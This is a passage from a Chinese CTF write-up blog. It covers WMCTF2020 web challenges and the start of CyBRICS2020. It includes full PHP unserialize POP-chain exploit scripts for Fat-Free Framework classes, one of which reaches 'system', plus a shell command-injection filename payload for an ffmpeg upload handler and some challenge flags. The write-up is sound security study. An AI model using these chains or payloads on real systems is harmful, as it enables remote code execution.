<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804111008.png" alt="image12618"></p>
<p>这样一个东西，这个函数就很nice</p>
<p>我们传入<code>WEB-&gt;send(&#39;/flag&#39;,false,true);</code>那么我们就能得到<code>/flag</code>的内容了</p>
<p>最后payload如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Agent</span> &#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            $<span class="title">server</span>=&quot;&quot;,</span><br><span class="line">            $<span class="title">id</span>=&quot;&quot;,</span><br><span class="line">            $<span class="title">socket</span>=&quot;&quot;,</span><br><span class="line">            $<span class="title">flag</span>=&quot;&quot;,</span><br><span class="line">            $<span class="title">verb</span>=&quot;&quot;,</span><br><span class="line">            $<span class="title">uri</span>=&quot;&quot;,</span><br><span class="line">            $<span class="title">headers</span>=&quot;&quot;;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events=[<span class="string">&quot;disconnect&quot;</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> \base(),<span class="string">&quot;run&quot;</span>)];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server=&amp;<span class="keyword">$this</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span></span><br><span class="line">            <span class="variable">$addr</span>=<span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="variable">$ctx</span>=<span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="variable">$wait</span>=<span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="variable">$sockets</span>=<span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="variable">$protocol</span>=<span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="variable">$agents</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$events</span> = [<span class="string">&quot;disconnect&quot;</span>=&gt;<span class="string">&quot;bbbbb&quot;</span>];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$val</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;addr = <span class="variable">$val</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Cursor</span>  <span class="title">implements</span> \<span class="title">IteratorAggregate</span> &#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            //! <span class="title">Flat</span>-<span class="title">file</span> <span class="title">DB</span> <span class="title">wrapper</span></span><br><span class="line">            $<span class="title">db</span>,</span><br><span class="line">            //! <span class="title">Data</span> <span class="title">file</span></span><br><span class="line">            $<span class="title">file</span>,</span><br><span class="line">            //! <span class="title">Document</span> <span class="title">identifier</span></span><br><span class="line">            $<span class="title">id</span>,</span><br><span class="line">            //! <span class="title">Document</span> <span class="title">contents</span></span><br><span class="line">            $<span class="title">document</span>=[],</span><br><span class="line">            //! <span class="title">field</span> <span class="title">map</span>-<span class="title">reduce</span> <span class="title">handlers</span></span><br><span class="line">            $<span class="title">_reduce</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">Jig</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Traversable</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mapper</span> <span class="keyword">extends</span> \<span class="title">DB</span>\<span class="title">Cursor</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span></span><br><span class="line">            <span class="comment">//! Flat-file DB wrapper</span></span><br><span class="line">            <span class="variable">$db</span>,</span><br><span class="line">            <span class="comment">//! Data file</span></span><br><span class="line">            <span class="variable">$file</span>,</span><br><span class="line">            <span class="comment">//! Document identifier</span></span><br><span class="line">            <span class="variable">$id</span>,</span><br><span class="line">            <span class="comment">//! Document contents</span></span><br><span class="line">            <span class="variable">$document</span>=[],</span><br><span class="line">            <span class="comment">//! field map-reduce handlers</span></span><br><span class="line">            <span class="variable">$_reduce</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> \base();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement getIterator() method.</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">exists</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement exists() method.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$val</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement set() method.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement get() method.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement clear() method.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span>(<span class="params"><span class="variable">$offset</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement offsetExists() method.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params"><span class="variable">$offset</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement offsetGet() method.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span>(<span class="params"><span class="variable">$offset</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement offsetSet() method.</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span>(<span class="params"><span class="variable">$offset</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement offsetUnset() method.</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Prefab</span> &#123;</span><br><span class="line">        <span class="title">static</span> <span class="title">function</span> <span class="title">instance</span>() &#123;</span><br><span class="line">            <span class="title">if</span> (!<span class="title">Registry</span>::<span class="title">exists</span>($<span class="title">class</span>=<span class="title">get_called_class</span>())) &#123;</span><br><span class="line">                $<span class="title">ref</span>=<span class="title">new</span> <span class="title">ReflectionClass</span>($<span class="title">class</span>);</span><br><span class="line">                <span class="variable">$args</span>=func_get_args();</span><br><span class="line">                Registry::set(<span class="variable">$class</span>,</span><br><span class="line">                    <span class="variable">$args</span>?<span class="variable">$ref</span>-&gt;newinstanceargs(<span class="variable">$args</span>):<span class="keyword">new</span> <span class="variable">$class</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> Registry::get(<span class="variable">$class</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Base</span> <span class="keyword">extends</span> <span class="title">Prefab</span> <span class="keyword">implements</span> <span class="title">ArrayAccess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span></span><br><span class="line">            <span class="variable">$hive</span>,</span><br><span class="line">            <span class="variable">$init</span>,</span><br><span class="line">            <span class="variable">$languages</span>,</span><br><span class="line">            <span class="variable">$locks</span>=[],</span><br><span class="line">            <span class="variable">$fallback</span>=<span class="string">&#x27;en&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;hive=[</span><br><span class="line">                <span class="string">&quot;ROUTES&quot;</span>=&gt;[<span class="string">&#x27;/flag/&#x27;</span>=&gt;[[<span class="string">&#x27;GET&#x27;</span>=&gt;<span class="number">1</span>]],<span class="string">&quot;2&quot;</span>=&gt;<span class="number">1</span>],</span><br><span class="line">                <span class="string">&quot;PATH&quot;</span>=&gt;<span class="string">&#x27;/flag/&#x27;</span>,<span class="comment">#$url</span></span><br><span class="line">                <span class="string">&quot;QUERY&quot;</span>=&gt;<span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;VERB&quot;</span>=&gt;<span class="string">&quot;GET&quot;</span>,</span><br><span class="line">                <span class="string">&quot;PARAMS&quot;</span>=&gt;[],</span><br><span class="line">                <span class="string">&quot;ONREROUTE&quot;</span>=&gt;<span class="string">&quot;WEB-&gt;send&quot;</span>,<span class="comment">#$func</span></span><br><span class="line">                <span class="string">&quot;CLI&quot;</span>=&gt;<span class="string">&#x27;123&#x27;</span></span><br><span class="line">                ];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span>(<span class="params"><span class="variable">$offset</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params"><span class="variable">$offset</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span>(<span class="params"><span class="variable">$offset</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement offsetSet() method.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span>(<span class="params"><span class="variable">$offset</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement offsetUnset() method.</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Magic</span> <span class="keyword">implements</span> \<span class="title">ArrayAccess</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> \CLI\WS(<span class="keyword">new</span> \CLI\Agent())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804111403.png" alt="image16897"></p>
<p>然而在题目中它虽然执行了<code>WEB-&gt;send</code>方法（根据错误信息得知），但是并不会返回<code>/flag</code>（所有文件都读不了），希望有看到的师傅给个解答</p>
<h3 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h3><p>果然是我一句魔术方法里面没啥好用的这一句话断送了我的flag，有这样一个魔术方法</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804114525.png" alt="image17108"></p>
<p>它通过控制<code>$this-&gt;props</code>我们可以调用任意函数，那么我们只需要找到一个可控参数的位置就可以了</p>
<p>找到</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804120508.png" alt="image17250"></p>
<p>构造payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Cursor</span>  <span class="title">implements</span> \<span class="title">IteratorAggregate</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span> <span class="title">extends</span> \<span class="title">DB</span>\<span class="title">Cursor</span>&#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            $<span class="title">props</span>=[&quot;<span class="title">quotekey</span>&quot;=&gt;&quot;<span class="title">system</span>&quot;],</span><br><span class="line">            $<span class="title">adhoc</span>=[&quot;<span class="title">ls</span> -<span class="title">al</span>&quot;=&gt;[&quot;<span class="title">expr</span>&quot;=&gt;&quot;&quot;]],</span><br><span class="line">            $<span class="title">db</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span>(<span class="params"><span class="variable">$offset</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params"><span class="variable">$offset</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span>(<span class="params"><span class="variable">$offset</span>, <span class="variable">$value</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span>(<span class="params"><span class="variable">$offset</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="variable">$val</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Agent</span> &#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            $<span class="title">server</span>=&quot;&quot;;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events=[<span class="string">&quot;disconnect&quot;</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="string">&quot;&quot;</span>)),<span class="string">&quot;find&quot;</span>)];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server=&amp;<span class="keyword">$this</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">array</span>(<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">WS</span>(),<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">Agent</span>())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Make-PHP-Great-Again-amp-amp-Make-PHP-Great-Again-2-0"><a href="#Make-PHP-Great-Again-amp-amp-Make-PHP-Great-Again-2-0" class="headerlink" title="Make PHP Great Again  &amp;&amp;  Make PHP Great Again 2.0"></a>Make PHP Great Again  &amp;&amp;  Make PHP Great Again 2.0</h2><p>这题是学长闲的无聊解出来的，说10分钟就ok的题目。。。膜拜</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804123108.png" alt="image18383"></p>
<p>实际调试的时候是这样的：</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/RF5J9(A_2K%24)Z4VG%251B0WZI.png" alt="image18481"></p>
<p>上面还有一堆tsrm_realpath_r。</p>
<p>还有啥好说的？看代码。。。。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/08/03/wmctf2020/" data-id="cku8ky2zi006udnnf6ijm87d9" data-title="wmctf2020" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CyBRICS2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/07/28/CyBRICS2020/" class="article-date">
  <time class="dt-published" datetime="2020-07-28T16:00:00.000Z" itemprop="datePublished">2020-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/07/28/CyBRICS2020/">CyBRICS2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="CyBRICS-2020"><a href="#CyBRICS-2020" class="headerlink" title="CyBRICS  2020"></a>CyBRICS  2020</h1><h2 id="Hunt"><a href="#Hunt" class="headerlink" title="Hunt"></a>Hunt</h2><p>用burp修改返回包</p>
<p>flag:<code>cybrics&#123;Th0se_c4p7ch4s_c4n_hunter2_my_hunter2ing_hunter2&#125;</code></p>
<h2 id="Gif2png"><a href="#Gif2png" class="headerlink" title="Gif2png"></a>Gif2png</h2><p>源代码已上传</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if not bool(re.match(&quot;^[a-zA-Z0-9_\-. &#x27;\&quot;\=\$\(\)\|]*$&quot;, file.filename)):</span><br><span class="line">    exit()</span><br><span class="line">...</span><br><span class="line">def allowed_file(filename):</span><br><span class="line">    return &#x27;.&#x27; in filename and filename.rsplit(&#x27;.&#x27;, 1)[1].lower() in ALLOWED_EXTENSIONS</span><br><span class="line">allowed_file(file.filename)</span><br><span class="line">...</span><br><span class="line">command = subprocess.Popen(f&quot;ffmpeg -i &#x27;uploads/&#123;file.filename&#125;&#x27; \&quot;uploads/&#123;uid&#125;/%03d.png\&quot;&quot;, shell=True)</span><br></pre></td></tr></table></figure>

<p><code>filename=&quot;&#39;$(sleep 5)&#39;a.gif&quot;</code>来执行命令</p>
<p>cybrics{imagesaresocoolicandrawonthem}</p>
<h2 id="woc"><a href="#woc" class="headerlink" title="woc"></a>woc</h2><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200726002857.png" alt="image631"></p>
<p>calc.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!preg_match(<span class="string">&#x27;#(?=^([ %()*+\-./]+|\d+|M_PI|M_E|log|rand|sqrt|a?(sin|cos|tan)h?)+$)^([^()]*|([^()]*\((?&gt;[^()]+|(?4))*\)[^()]*)*)$#s&#x27;</span>, <span class="variable">$field</span>)) &#123;</span><br><span class="line">        <span class="variable">$value</span> = <span class="string">&quot;BAD&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$value</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$field</span>;&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">9999999999999999999:1.0E+25</span><br><span class="line">1/0:INF</span><br><span class="line">0/0:NAN</span><br><span class="line">log(0):-INF</span><br></pre></td></tr></table></figure>


<p>newtemplate.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (strpos(<span class="variable">$html</span>, <span class="string">&#x27;&lt;?&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="variable">$error</span> = <span class="string">&quot;Bad chars&quot;</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">file_put_contents(<span class="string">&quot;calcs/<span class="subst">$userid</span>/templates/<span class="subst">$uuid</span>.html&quot;</span>, <span class="variable">$html</span>);</span><br></pre></td></tr></table></figure>

<p>calc.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="string">&quot;calcs/<span class="subst">$userid</span>/<span class="subst">$calc</span>.php&quot;</span>, <span class="string">&quot;&lt;script&gt;var preloadValue = &lt;?=json_encode((string)(<span class="subst">$field</span>))?&gt;;&lt;/script&gt;\n&quot;</span> . file_get_contents(<span class="string">&quot;inc/calclib.html&quot;</span>) . file_get_contents(<span class="string">&quot;calcs/<span class="subst">$userid</span>/templates/<span class="subst">$template</span>.html&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>html转php处，利用<code>/*</code>破坏结构，<code>file_get_contents(&quot;calcs/$userid/templates/$template.html&quot;))</code>处<code>*/</code>收尾，于是绕过成功</p>
<p>新建template:</p>
